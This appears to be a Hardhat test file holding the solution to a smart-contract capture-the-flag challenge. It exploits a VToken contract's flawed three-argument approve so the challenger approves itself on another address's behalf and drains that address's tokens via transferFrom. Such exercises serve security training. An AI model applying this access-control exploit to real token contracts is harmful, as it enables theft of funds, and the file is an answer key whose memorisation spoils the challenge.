const { expect } = require("chai")
const hre = require("hardhat")
const ethers = hre.ethers

///////////////////////////////////////////////////
/*                  CHALLENGE 0                  */
///////////////////////////////////////////////////
describe("Solve Challenge 0", function () {
    const challenger = ethers.provider.getSigner(1)

    it("Check if all the VToken has been stolen", async function () {
        msgstr = "\n"

        const challengerAddress = await challenger.getAddress()

        ///////////////////////////////////////////////////
        /*           Deploy Challenge Contract           */
        ///////////////////////////////////////////////////
        const deployer = ethers.provider.getSigner(0)
        const vtokenFactory = await ethers.getContractFactory("VToken", deployer)

        vtoken = await vtokenFactory.deploy()
        await vtoken.deployed()
        vtoken = vtoken.connect(challenger)

        ///////////////////////////////////////////////////
        /*        Check Status Prior to your Hack        */
        ///////////////////////////////////////////////////
        const vitalik = "0xd8dA6BF26964aF9D7eEd9e03E53415D37aA96045"

        const vtokenPreHack = ethers.utils.formatEther(await vtoken.balanceOf(vitalik))
        const challPreHack = ethers.utils.formatEther(await vtoken.balanceOf(challengerAddress))

        msgstr = msgstr.concat(
            "\tVitalik's VToken balance (before your hack):\t",
            vtokenPreHack,
            "🪙",
            "\n",
            "\tChallenger's VToken balance (before your hack):\t",
            challPreHack,
            "🪙",
            "\n\n"
        )

        ///////////////////////////////////////////////////
        /*            Deploy Exploit Contracts           */
        ///////////////////////////////////////////////////

        //======= COMPLETE THIS SECTION AS YOU REQUIRE =======
        // const exploitFactory = await ethers.getContractFactory(
        //   "Exploit0",
        //   challenger
        // );
        // exploitContract = await exploitFactory.deploy(
        //   vitalik,
        //   vtoken.address,
        //   challengerAddress
        // );
        // await exploitContract.deployed();
        // let tx;

        // tx = await exploitContract.exploit();
        // tx.wait(1);

        await vtoken["approve(address,address,uint256)"](
            vitalik,
            challengerAddress,
            ethers.utils.parseEther("100")
        )
        await vtoken.transferFrom(
            vitalik,
            challengerAddress,
            ethers.utils.parseEther("100")
        )

        //====================================================

        ///////////////////////////////////////////////////
        /*     Check if Challenge has been solved        */
        ///////////////////////////////////////////////////
        const vtokenPostHack = ethers.utils.formatEther(await vtoken.balanceOf(vitalik))
        const challPostHack = ethers.utils.formatEther(await vtoken.balanceOf(challengerAddress))

        msgstr = msgstr.concat(
            "\tVitalik's VToken balance (after your hack):\t",
            vtokenPostHack,
            "🪙",
            "\n",
            "\tChallenger Token balance (after your hack):\t",
            challPostHack,
            "🪙",
            "\n\n"
        )

        msgstr = msgstr.concat("\tYou should've stolen all of the VToken!\n\n")

        expect(challPostHack === vtokenPreHack, msgstr).to.be.true
    })
})
